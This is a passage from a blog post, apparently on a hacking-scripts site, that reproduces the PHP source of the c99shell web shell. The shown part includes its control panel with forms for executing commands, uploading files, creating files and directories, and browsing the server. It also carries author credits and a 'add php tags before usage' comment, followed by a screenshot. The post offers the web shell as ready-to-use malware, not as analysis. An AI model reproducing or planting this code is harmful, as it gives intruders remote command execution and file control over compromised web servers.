  "ext_jpg"=&gt;array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),
  "ext_html"=&gt;array("ext_html","ext_htm"),
  "ext_avi"=&gt;array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),
  "ext_lnk"=&gt;array("ext_lnk","ext_url"),
  "ext_ini"=&gt;array("ext_ini","ext_css","ext_inf"),
  "ext_doc"=&gt;array("ext_doc","ext_dot"),
  "ext_js"=&gt;array("ext_js","ext_vbs"),
  "ext_cmd"=&gt;array("ext_cmd","ext_bat","ext_pif"),
  "ext_wri"=&gt;array("ext_wri","ext_rtf"),
  "ext_swf"=&gt;array("ext_swf","ext_fla"),
  "ext_mp3"=&gt;array("ext_mp3","ext_au","ext_midi","ext_mid"),
  "ext_htaccess"=&gt;array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")
 );
 if (!$getall)
 {
  header("Content-type: image/gif");
  header("Cache-control: public");
  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
  header("Cache-control: max-age=".(60*60*24*7));
  header("Last-Modified: ".date("r",filemtime(__FILE__)));
  foreach($imgequals as $k=&gt;$v) {if (in_array($img,$v)) {$img = $k; break;}}
  if (empty($images[$img])) {$img = "small_unk";}
  if (in_array($img,$ext_tar)) {$img = "ext_tar";}
  echo base64_decode($images[$img]);
 }
 else
 {
  foreach($imgequals as $a=&gt;$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \$images[".$d."]&lt;br&gt;");}}}}
  natsort($images);
  $k = array_keys($images);
  echo  "&lt;center&gt;";
  foreach ($k as $u) {echo $u.":&lt;img src=\"".$surl."act=img&img=".$u."\" border=\"1\"&gt;&lt;br&gt;";}
  echo "&lt;/center&gt;";
 }
 exit;
}
if ($act == "about") {echo "&lt;center&gt;&lt;b&gt;Credits:&lt;br&gt;Idea, leading and coding by tristram[CCTeaM].&lt;br&gt;Beta-testing and some tips - NukLeoN [AnTiSh@Re tEaM].&lt;br&gt;Thanks all who report bugs.&lt;br&gt;All bugs send to tristram's ICQ #656555 &lt;a href=\"http://wwp.icq.com/scripts/contact.dll?msgto=656555\"&gt;&lt;img src=\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\" border=0 align=absmiddle&gt;&lt;/a&gt;.&lt;/b&gt;";}
?>
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;a bookmark="minipanel"&gt;&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;
&lt;tr&gt;&lt;td width="100%" height="1" valign="top" colspan="2"&gt;&lt;p align="center"&gt;&lt;b&gt;:: &lt;a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"&gt;&lt;b&gt;Command execute&lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Enter: &lt;/b&gt;&lt;form action="<?php echo $surl; ?>act=cmd" method="POST"&gt;&lt;input type="hidden" name="act" value="cmd"&gt;&lt;input type="hidden" name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="cmd" size="50" value="<?php echo htmlspecialchars($cmd); ?>"&gt;&lt;input type="hidden" name="cmd_txt" value="1"&gt;&nbsp;&lt;input type="submit" name="submit" value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;Select: &lt;/b&gt;&lt;form action="<?php echo $surl; ?>act=cmd" method="POST"&gt;&lt;input type="hidden" name="act" value="cmd"&gt;&lt;input type="hidden" name="d" value="<?php echo $dispd; ?>"&gt;&lt;select name="cmd"&gt;<?php foreach ($cmdaliases as $als) {echo "&lt;option value=\"".htmlspecialchars($als[1])."\"&gt;".htmlspecialchars($als[0])."&lt;/option&gt;";} ?>&lt;/select&gt;&lt;input type="hidden" name="cmd_txt" value="1"&gt;&nbsp;&lt;input type="submit" name="submit" value="Execute"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/TABLE&gt;
&lt;br&gt;
&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;
&lt;tr&gt;
 &lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: &lt;a href="<?php echo $surl; ?>act=search&d=<?php echo urlencode($d); ?>"&gt;&lt;b&gt;Search&lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type="hidden" name="act" value="search"&gt;&lt;input type="hidden" name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="search_name" size="29" value="(.*)"&gt;&nbsp;&lt;input type="checkbox" name="search_name_regexp" value="1"  checked&gt; - regexp&nbsp;&lt;input type="submit" name="submit" value="Search"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/p&gt;&lt;/td&gt;
 &lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: &lt;a href="<?php echo $surl; ?>act=upload&d=<?php echo $ud; ?>"&gt;&lt;b&gt;Upload&lt;/b&gt;&lt;/a&gt; ::&lt;/b&gt;&lt;form method="POST" ENCTYPE="multipart/form-data"&gt;&lt;input type="hidden" name="act" value="upload"&gt;&lt;input type="file" name="uploadfile"&gt;&lt;input type="hidden" name="miniform" value="1"&gt;&nbsp;&lt;input type=submit name=submit value="Upload"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: Make Dir ::&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type="hidden" name="act" value="mkdir"&gt;&lt;input type="hidden" name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="mkdir" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: Make File ::&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type="hidden" name="act" value="mkfile"&gt;&lt;input type="hidden" name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="mkfile" size="50" value="<?php echo $dispd; ?>"&gt;&lt;input type="hidden" name="ft" value="edit"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;br&gt;<?php echo $wdt; ?>&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: Go Dir ::&lt;/b&gt;&lt;form action="<?php echo htmlspecialchars($surl); ?>"&gt;&lt;input type="hidden" name="act" value="ls"&gt;&lt;input type="text" name="d" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type="submit" value="Go"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;td width="50%" height="1" valign="top"&gt;&lt;center&gt;&lt;b&gt;:: Go File ::&lt;/b&gt;&lt;form action="<?php echo htmlspecialchars($surl); ?>"&gt;&lt;input type="hidden" name="act" value="gofile"&gt;&lt;input type="hidden" name="d" value="<?php echo $dispd; ?>"&gt;&lt;input type="text" name="f" size="50" value="<?php echo $dispd; ?>"&gt;&nbsp;&lt;input type="submit" value="Go"&gt;&lt;/form&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;br&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="990" height="1" valign="top"&gt;&lt;p align="center"&gt;&lt;b&gt;--[ c99shell v. <?php echo $shver; ?> &lt;a href="<?php echo $surl; ?>act=about"&gt;&lt;u&gt;&lt;b&gt;powered by&lt;/b&gt;&lt;/u&gt;&lt;/a&gt; Captain Crunch Security Team | &lt;a href="http://ccteam.ru"&gt;&lt;font color="#FF0000"&gt;http://ccteam.ru&lt;/font&gt;&lt;/a&gt;&lt;a href="http://www.c99shell.gen.tr" title"c99.txt"&gt;c99.txt&lt;/a&gt;&lt;font color="#FF0000"&gt;&lt;/font&gt; | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--&lt;/b&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/body&gt;&lt;/html&gt;<?php chdir($lastdir); exit;
//add php tags before usage

?>
{% endhighlight %}


### C99 shell (beta) screenshot

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/c99-beta-1024x509.png" alt="c99 shell beta screenshot" width="604" height="300" class="aligncenter size-large wp-image-327" />][2]

 [1]: http://hackingscripts.com/c99-shell/ "C99 shell"
 [2]: {{ site.baseurl }}/wp-content/uploads/2014/02/c99-beta.png